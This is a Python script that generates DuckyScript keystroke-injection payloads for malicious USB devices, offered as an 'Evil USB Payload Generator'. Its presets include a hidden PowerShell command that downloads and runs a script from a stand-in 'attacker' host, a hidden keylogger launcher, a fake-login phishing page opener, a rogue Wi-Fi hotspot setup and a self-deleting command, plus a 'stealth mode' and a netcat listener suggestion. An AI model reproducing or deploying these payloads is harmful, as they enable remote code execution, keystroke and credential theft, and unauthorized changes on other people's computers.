# evil_usb_generator.py

import os
from datetime import datetime
import random
import re

PAYLOADS = {
    "reverse_shell": '''
DELAY 1000
GUI r
DELAY 300
STRING powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')\"
ENTER
''',
    "keylogger": '''
DELAY 1000
GUI r
DELAY 300
STRING powershell -WindowStyle hidden -c \"Start-Process 'logger.exe'\"
ENTER
''',
    "open_website": '''
DELAY 1000
GUI r
DELAY 300
STRING start https://fake-login.example.com
ENTER
''',
    "wifi_reconfig": '''
DELAY 1000
GUI r
DELAY 300
STRING netsh wlan set hostednetwork mode=allow ssid=FreeWiFi key=password123
ENTER
STRING netsh wlan start hostednetwork
ENTER
''',
    "self_destruct": r'''
DELAY 1000
GUI r
DELAY 300
STRING powershell -nop -w hidden -c "Start-Sleep -s 3; Remove-Item -Path $MyInvocation.MyCommand.Path -Force"
ENTER
'''

}

def list_payloads():
    print("Available Payloads:")
    for i, name in enumerate(PAYLOADS, 1):
        print(f"[{i}] {name.replace('_', ' ').title()}")

def apply_stealth_mode(payload):
    lines = payload.strip().splitlines()
    new_lines = []
    for line in lines:
        new_lines.append(line)
        if line.startswith("STRING"):
            new_lines.append(f"DELAY {random.randint(50, 250)}")
    return "\n".join(new_lines)

def contains_dangerous_commands(payload):
    dangerous_patterns = [r'remove-item', r'shutdown', r'format', r'rd /s /q']
    for pattern in dangerous_patterns:
        if re.search(pattern, payload, re.IGNORECASE):
            return True
    return False

def payload_stats(payload):
    lines = payload.strip().splitlines()
    delay_count = sum(1 for line in lines if line.startswith("DELAY"))
    string_count = sum(1 for line in lines if line.startswith("STRING"))
    total_lines = len(lines)
    print("\n--- Payload Stats ---")
    print(f"Total lines: {total_lines}")
    print(f"STRING commands: {string_count}")
    print(f"DELAY commands: {delay_count}")
    print(f"Estimated time (ms): {sum(int(line.split()[1]) for line in lines if line.startswith('DELAY'))}")
    print("----------------------\n")

def generate_listener_instructions(payload):
    if 'DownloadString' in payload and 'http' in payload:
        print("\n[!] This looks like a reverse shell payload. Example listener:")
        print("    nc -lvnp 4444\n")

def generate_payload(content, filename):
    with open(filename, 'w') as f:
        f.write(content)
    print(f"[+] Payload saved as {filename}")

def main():
    print("Evil USB Payload Generator")
    print("[1] Use preset payload")
    print("[2] Write custom payload")
    try:
        mode = int(input("Choose an option (1 or 2): "))
        if mode == 1:
            list_payloads()
            choice = int(input("\nSelect a payload number to generate: "))
            keys = list(PAYLOADS.keys())
            if 1 <= choice <= len(keys):
                content = PAYLOADS[keys[choice - 1]]
            else:
                print("[!] Invalid choice.")
                return
        elif mode == 2:
            print("Enter your custom DuckyScript below (end with an empty line):")
            lines = []
            while True:
                line = input()
                if line.strip() == "":
                    break
                lines.append(line)
            content = "\n".join(lines)
        else:
            print("[!] Invalid mode selected.")
            return

        stealth = input("Enable stealth mode? (y/n): ").lower()
        if stealth == 'y':
            content = apply_stealth_mode(content)

        # Payload statistics
        payload_stats(content)

        # Dangerous command warning
        if contains_dangerous_commands(content):
            confirm = input("[!] Dangerous command detected! Are you sure you want to save it? (y/n): ").lower()
            if confirm != 'y':
                print("[!] Payload creation aborted.")
                return

        # Listener suggestion
        generate_listener_instructions(content)

        default_name = f"payload_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        filename = input(f"Enter output filename [default: {default_name}]: ") or default_name
        generate_payload(content, filename)
    except ValueError:
        print("[!] Invalid input. Please enter a number.")

if __name__ == '__main__':
    main()
